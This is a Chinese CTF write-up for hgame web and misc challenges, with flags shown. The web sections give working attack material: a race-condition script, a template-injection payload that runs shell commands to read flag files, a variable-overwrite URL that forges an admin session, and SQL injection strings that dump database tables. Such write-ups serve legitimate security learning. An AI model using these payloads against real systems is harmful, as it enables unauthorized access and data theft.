class="string">r&quot;&lt;mn&gt;(\d&#123;1,9&#125;)&lt;/mn&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;([+-]&#123;1&#125;)&lt;/mo&gt;&lt;mn&gt;(\d&#123;1,9&#125;)&quot;</span></span><br><span class="line">        matches = re.findall(regex, questionRaw.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br><span class="line">        arg1, operator, arg2 = matches[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Calculate &#123;&#125; with &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(matches, arg1, operator, arg2))</span><br><span class="line">        x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        result = <span class="string">&quot;%.2f&quot;</span> % (integrate(<span class="built_in">int</span>(arg1) * x + <span class="built_in">int</span>(arg2), (x, lowerLimit, upperLimit)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Calculated result is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line"></span><br><span class="line">        response = session.post(url + <span class="string">&quot;api/verify&quot;</span>, data=json.dumps(&#123;<span class="string">&quot;answer&quot;</span>: result&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Verify status is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;true&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Verify correct with &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Raw data is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content))</span><br><span class="line">        response.close()</span><br><span class="line">        status = session.get(url + <span class="string">&quot;api/getStatus&quot;</span>).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Status is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(status))</span><br><span class="line">        index = session.get(url).content</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Index is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Done All for you and cookie is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session.cookies))</span><br></pre></td></tr></table></figure>
+
+<p>最后看到输出结果之后，将新的 cookie 重新应用于页面，刷新后即可看到 flag。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Done All for you and cookie is &lt;RequestsCookieJar[&lt;Cookie session&#x3D;eyJzb2x2aW5nIjoxMDB9.YBZaeA.1FXCgOvOT6RDRijlX1RhlG6arlI for r4u.top&#x2F;&gt;]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286433864.cafdb6939be55e367ed66b6c72327e681b582724.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3very0ne_H4tes_Math&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><blockquote>
+<p>Content-Length 的计算方法：</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397286716761.7f2114e78469e470a2b380ea6d67bb020250a9a6.png"></p>
+</blockquote>
+<!-- ![](https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287283996.af1cb16d36e4861fdfc5fe939ae8a4a57ebd0d72.png) -->
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Fe3l^tHe~4N9eR+oF_5mu9gl3r!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Liki的生日礼物"><a href="#Liki的生日礼物" class="headerlink" title="Liki的生日礼物"></a>Liki的生日礼物</h3><p>进入靶机之后发现是一个兑换系统，有一个用于兑换的 API。很容易猜想到使用多线程请求去多兑换。于是写一个脚本实现。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;https://birthday.liki.link/API/&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RushThread</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Thread Rushed&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&quot;m&quot;</span>: <span class="string">&#x27;buy&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = session.post(url=ENV, params=param, data=data)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="built_in">print</span>(session.cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&quot;m&quot;</span>: <span class="string">&#x27;login&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="number">122</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="number">12</span></span><br><span class="line">&#125;</span><br><span class="line">response = session.post(ENV, params=param, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=RushThread, args=()).start()</span><br></pre></td></tr></table></figure>
+
+<p>使用三十个线程去竞争，最后可以兑换得到超额的兑换券，从而兑换到 switch。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287601915.5200e81022cc326b294603ce261ce7fc07565205.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;L0ck_1s_TH3_S0lllut!on!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><p>登录后可以添加 Note，试探一下可以发现 SSTI 注入点。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403884018.0cd3efd6b4d820df67eb99a4409453493d125142.png"></p>
+<p>稍微尝试后可以构造出如下 payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&#39;od$IFS$9-c$IFS$9&#x2F;f*&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613403938612.0f0f5f5abe79131881163ae843866819ad85e8ee.png"></p>
+<p>整理后可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;h0w_4bou7+L3arn!ng~PythOn^Now?&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h3><p>访问 <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 可以泄露出一部分源码，下载下来先大致审计一遍。User 中存在以下弱比较，可能直接登录。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$password</span>) == <span class="variable">$userList</span>[<span class="variable">$username</span>][<span class="string">&#x27;pass_md5&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>lazy.php 中存在如下变量注册，可能会存在变量覆盖。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接注册所有变量，这样我就能少打字力，芜湖~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$youBadBad</span>)&#123;</span><br><span class="line">            <span class="variable">$_k</span> = str_replace(<span class="variable">$youBadBad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_k</span>); <span class="comment">//# 仅做了一次替换，这里可以直接双写绕过</span></span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag.php 中存在对 SESSION 中值的直接判断。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;admin将于今日获取自己忠实的flag&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">$flag</span>&lt;/h3&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$submit</span> == <span class="string">&quot;getflag&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">&#123;$_SESSION[&#x27;username&#x27;]&#125;</span>接近了问题的终点&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;篡位者占领了神圣的页面&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时可以尝试使用变量覆盖达成对 SESSION 中值的覆盖。因此构造出如下 payload。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f2035f880d.lazy.r4u.top/flag.php?_SESSIOSESSIONN[username]=admin</span><br></pre></td></tr></table></figure>
+
+<p>此时 SESSION 中的 username 被覆盖成为 admin，从而成功得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927165219.2df95ad8448dd57aecc64076f8aa72938baefd1e.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;R4U-!s_A~l@zy_D0G&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h3><p>点击按钮可以发现如下线索，server.php 的请求头中包含了奇怪的参数。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614927402598.abe03a338b6dd2d432359de263bfa09222c24c9c.png"></p>
+<p>尝试后可以发现 status 处存在 SQL 注入。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-2&#39;&#x2F;**&#x2F;or(2&#x3D;1)# ---&gt; 无回显</span><br><span class="line">-2&#39;&#x2F;**&#x2F;or(1)# ---&gt; HTTP 200 OK</span><br></pre></td></tr></table></figure>
+
+<p>于是一把梭先构造一个联合注入 <code>-2&#39;/**/uNion/**/seLect/**/1#</code> 得到 <code>1</code> 的回显。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span><span class="string">&#x27;/**/uNion/**/seLect/**/groUp_concat(schema_name)/**/frOm/**/infOrmation_schEma.schEmata# </span></span><br><span class="line"><span class="string">爆出数据库 information_schema,mysql,performance_schema,sys,week2sqli</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-2&#x27;</span><span class="comment">/**/</span><span class="keyword">uNion</span><span class="comment">/**/</span><span class="keyword">seLect</span><span class="comment">/**/</span>group_concat(tablE_nAme)<span class="comment">/**/</span><span class="keyword">frOm</span><span class="comment">/**/</span>infOrmation_schEma.tablEs<span class="comment">/**/</span><span class="keyword">whEre</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>databAse()# </span><br><span class="line">爆出表 f1111111144444444444g,status</span><br><span class="line"></span><br><span class="line"><span class="number">-2</span><span class="string">&#x27;/**/uNion/**/seLect/**/group_concat(cOlumn_nAme)/**/frOm/**/infOrmation_schEma.colUmns/**/whEre/**/table_schema=databAse()# </span></span><br><span class="line"><span class="string">爆出表中的字段 ffffff14gggggg,id,status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-2&#x27;</span><span class="comment">/**/</span><span class="keyword">uNion</span><span class="comment">/**/</span><span class="keyword">seLect</span><span class="comment">/**/</span>group_concat(ffffff14gggggg)<span class="comment">/**/</span><span class="keyword">frOm</span><span class="comment">/**/</span>f1111111144444444444g# </span><br><span class="line">查出 flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!&#x3D;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>顺手查出了 status。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP 200 OK,NETWORK ERROR,HTTP 400 Bad Request,HTTP 401 Unauthorized,HTTP 403 Forbidden,HTTP 404 Not Found,HTTP 405 Method Not Allowed,HTTP 406 Not Acceptable,HTTP 408 Request Timeout,HTTP 414 URI Too Long,HTTP 418 I&#39;m a teapot,HTTP 500 Internal Server Error,HTTP 502 Bad Gateway,HTTP 503 Service Unavailable,HTTP 504 Gateway Timeout,UNKNOWN ERROR</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>base 编码套娃，通过 <code>base64 --&gt; base32 --&gt; From Hex</code> 解码即可以得出 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287897688.c9f7249614a482f5f80ac758582ed09d4cf60d3a.png"></p>
+<h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><p>010 editor 打开图片发现文件尾部有压缩文件。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288170728.8d1b95abab4fa5e5e171d03a37c8c7dc52733800.png"></p>
+<p>分离出来后压缩包的备注处有如下提示。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password is picture ID (Up to 8 digits)</span><br></pre></td></tr></table></figure>
+
+<p>根据提示使用 ARCHPR 爆破得到压缩包密码为 70415155。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288474325.cef270df89e9fe21b6e8d685e8f4c829b0be0424.png"></p>
+<p>解压之后在 NO PASSWORD 文本文档中得到如下信息。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sometimes we don&#39;t need to care about password.</span><br><span class="line">Because it&#39;s too strong or null. XD</span><br><span class="line">By the way, I only use storage.</span><br></pre></td></tr></table></figure>
+
+<p>查看两个压缩包中的 NO PASSWORD 的 CRC，发现是一样的。于是单独压缩一份 NO PASSWORD 然后对解压出来的 plain.zip 进行明文攻击，可以得出密码为 <code>C8uvP$DP</code>。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288843522.154d75431f8302befbc81ff4829f7284b9e2c24a.png"></p>
+<p>解压 plain.zip 得到 flag.zip。使用 010 editor 打开文件可得如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;</span><br></pre></td></tr></table></figure>
+
+<p>将其 HTML Entity 解码即可得到 flag。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;2IP_is_Usefu1_and_Me9umi_i5_W0r1d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><p>Wireshark 分析流量包，筛选 http 条目，跟踪 HTTP 流到 TCP 流 26 可见图片文件。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289103836.51f782600e5994cc2d0f9b797db627dc4fa1af1b.png"></p>
+<p>将图片提取出来使用 010 editor 打开，模板运行有 CRC Mismatch 报错，于是用脚本爆破得图片宽高 <code>hex: 0x1440 0x1000</code>。将图片宽高修正可得 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289611138.c9121599247804ee6de2f77321405b1b44827e15.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Wh4t_A_W0nderfu1_Wa11paper&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>解压得到两个 Word 文档，将 first.docx 解压，可以从 password.xml 中找到一段 BrainFuck 字符串。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br></pre></td></tr></table></figure>
+
+<p>可解得 maimai.docx 的密码 <code>DOYOUKNOWHIDDEN?</code>。打开 maimai.docx 后显示隐藏字符可得一串制表符和空格错落的内容。并且图片暗示<code>雪</code>，因此考虑 snow 隐写。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290090528.e2f2c51101eb34efd17d2b3b440695b4cba5cff6.png"></p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	 	  	       	  	     	     	   	   	  </span><br><span class="line"> 	       	 	    	      		       		     	  </span><br><span class="line"> 	     	     	    	      	   		  	  	 </span><br><span class="line">    	 	     	       	       	    	      		 	 </span><br><span class="line">  	      	 	 	     	  	   	       	       	 </span><br><span class="line">  	      	 	    	  	      	     	    	      	     </span><br><span class="line">    	     	    		  	 	       		     	    </span><br><span class="line">   	       	       	 	  	      	 	    	  	      </span><br><span class="line">     	    	   	    	  	      	     	    	     	    </span><br><span class="line">	  	   		  	     	 		     	      </span><br><span class="line">	    	    	    	   	       	  </span><br></pre></td></tr></table></figure>
+
+<p>将以上字符保存为 html 文件并上传到服务器中获取链接，利用<a target="_blank" rel="noopener" href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">在线加解密工具</a>解密可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p>在 Matryoshka.jpg 的文件备注中发现了 <code>!LyJJ9bi&amp;M7E72*JyD</code>，根据 F5 的暗示猜测其为 F5 隐写。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290281286.29981c9d09e186d7d9ae09b75fb8f6487f330acc.png"></p>
+<p>使用 F5 隐写工具提取出内容可得 <code>e@317S*p1A4bIYIs1M</code>。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290528230.731ea50868a7a847acf6e194cbddb39e0ca0cb55.png" alt="image-20210207123441141"></p>
+<p>将 <code>e@317S*p1A4bIYIs1M</code> 作为压缩包密码解压可得 01.jpg。根据暗示可知其经过了 steghide 隐写。在 01.jpg 的文件备注中发现了 <code>A7SL9nHRJXLh@$EbE8</code>，将其作为密码执行 steghide extract 之后得到了 pwd.txt。其中包含了 <code>u0!FO4JUhl5!L55%$&amp;</code>。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290765999.712d328b969859426c837dec205e702f467e9517.png"></p>
+<p>将其作为压缩包密码解压 Steghide.7z，得到 Outguess.7z 和 02.jpg。在图片的备注信息中可得 <code>z0GFieYAee%gdf0%lF</code>。将其作为密码执行 outguess 可得 <code>@UjXL93044V5zl2ZKI</code>。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291060987.7db9c6685f0d53c12e15af7bce329a0edd205a9d.png"></p>
+<p>将其作为压缩包密码解压 Outguess.7z 可得 03.jpg 和 JPHS.7z。图片文件的备注中可得 <code>rFQmRoT5lze@4X4^@0</code>。将其作为密码执行 JPHS 可解得 <code>xSRejK1^Z1Cp9M!z@H</code>。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291463382.36ecab86fd98c24d729c10e3be95c426648ff0fe.png"></p>
+<p>将其作为压缩包密码解压 JPHS.7z 可得 4.jpg。至此四片二维码切片集齐。用 Snipaste 简单拼一下图得到一个二维码。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291707926.5ff886d610de5ccf011304a7f6c76618711ef793.png"></p>
+<p>扫描二维码可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Taowa_is_N0T_g00d_but_T001s_is_Useful&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Telegraph：1601-6639-3459-3134-0892"><a href="#Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="Telegraph：1601 6639 3459 3134 0892"></a>Telegraph：1601 6639 3459 3134 0892</h3><p>将题目的 <code>1601 6639 3459 3134 0892</code> 使用中文电码解码可得到如下信息。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291901884.c6bab1a317354791cb68dbc2278a19793a58555f.png"></p>
+<p>使用 Audition 打开音频文件，可见如下提示。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292249542.eeac6bdb8d0fb67cad56b57bf50c85deb687d345.png"></p>
+<p>将 850Hz 处的内容提取出来，其中一段可见明显的摩斯电码。将其截取并抄收下来，可以得到如下内容。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292617887.a7920858a88af068a3df8ff8be75188506669e96.png"></p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</span><br></pre></td></tr></table></figure>
+
+<p>使用摩斯电码解码可得到 flag。</p>
